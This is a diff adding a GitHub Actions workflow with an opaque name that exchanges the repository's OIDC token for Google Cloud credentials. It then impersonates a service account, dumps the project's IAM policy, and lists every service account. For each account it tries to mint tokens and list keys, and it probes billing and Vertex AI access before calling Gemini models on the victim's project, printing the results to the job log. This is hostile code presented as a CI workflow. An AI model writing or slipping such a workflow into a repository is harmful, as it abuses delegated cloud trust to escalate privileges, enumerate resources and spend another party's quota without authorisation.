@@ -1,0 +1,73 @@
+name: p40c
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p40c:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - name: p40c
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          NUM=303574531351
+          PID=aryeelab
+          SA='github-actions@aryeelab.iam.gserviceaccount.com'
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          J=""
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##FT len=${#FT}"
+          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' g.json)
+          echo "##GEN code=$gc toklen=${#AT}"
+          echo "### full project IAM policy"
+          curl -s -o pol.json -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d '{}'
+          echo "##POLICY_JSON $(jq -c . pol.json 2>/dev/null | head -c 14000)"
+          echo "### service account list"
+          curl -s -o sal.json -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts"
+          jq -r '.accounts[]? | "##SAL \(.email) \(.displayName // "")"' sal.json 2>/dev/null
+          echo "### try generateAccessToken on every enumerated SA"
+          jq -r '.accounts[]?.email' sal.json > sas.txt 2>/dev/null
+          echo "##SACOUNT $(wc -l < sas.txt)"
+          while read -r T; do
+            [ -z "$T" ] && continue
+            c=$(curl -s -o gg.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$T:generateAccessToken" -d @req.json)
+            T2=$(jq -r '.accessToken // empty' gg.json)
+            echo "##IMP sa=$T code=$c toklen=${#T2} body=$(head -c 200 gg.json | tr -d '\n' | tr -s ' ')"
+            kc=$(curl -s -o kk.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$T/keys")
+            echo "##KEYS sa=$T code=$kc body=$(head -c 200 kk.json | tr -d '\n' | tr -s ' ')"
+            [ -z "$T2" ] && continue
+            mc=$(curl -s -o mm.json -w '%{http_code}' -H "Authorization: Bearer $T2" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models")
+            echo "##IMPAPI sa=$T label=models-central1 code=$mc body=$(head -c 200 mm.json | tr -d '\n' | tr -s ' ')"
+            bc=$(curl -s -o bb.json -w '%{http_code}' -H "Authorization: Bearer $T2" "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo")
+            echo "##IMPAPI sa=$T label=billing code=$bc body=$(head -c 300 bb.json | tr -d '\n' | tr -s ' ')"
+          done < sas.txt
+          echo "### model-garden attempts with correct names"
+          for M in gemini-2.0-flash gemini-2.0-flash-001 gemini-1.5-flash-002 gemini-2.5-flash text-bison; do
+            for LOC in us-central1 global; do
+              jq -n '{contents:[{role:"user",parts:[{text:"ping"}]}],generationConfig:{maxOutputTokens:8}}' > genc.json
+              c=$(curl -s -o mg.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
+                "https://${LOC}-aiplatform.googleapis.com/v1/projects/$NUM/locations/$LOC/publishers/google/models/$M:generateContent" -d @genc.json)
+              echo "##MODEL loc=$LOC model=$M code=$c body=$(head -c 300 mg.json | tr -d '\n' | tr -s ' ')"
+            done
+          done
+          echo "### raw model list bodies"
+          curl -s -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models?pageSize=20" -o ml.json
+          echo "##MLLIST $(head -c 600 ml.json | tr -d '\n')"
+          echo "##FINISHED3"
